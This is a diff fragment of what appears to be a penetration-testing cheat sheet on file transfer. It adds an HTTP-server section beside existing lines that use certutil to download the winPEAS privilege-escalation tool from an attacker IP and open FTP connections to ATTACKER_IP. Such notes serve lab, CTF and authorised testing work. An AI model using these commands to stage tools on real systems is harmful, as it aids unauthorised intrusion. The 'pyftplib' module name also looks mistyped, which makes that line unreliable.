@@ -43,3 +43,9 @@ certutil -urlcache -f http://10.10.15.5/winPEASx64.exe winpeas.exe
 python -m pyftplib 21 (attacker machine)
 ftp ATTACKER_IP
 ```
+
+## HTTP
+
+```
+python2 -m SimpleHTTPServer 8000
+```
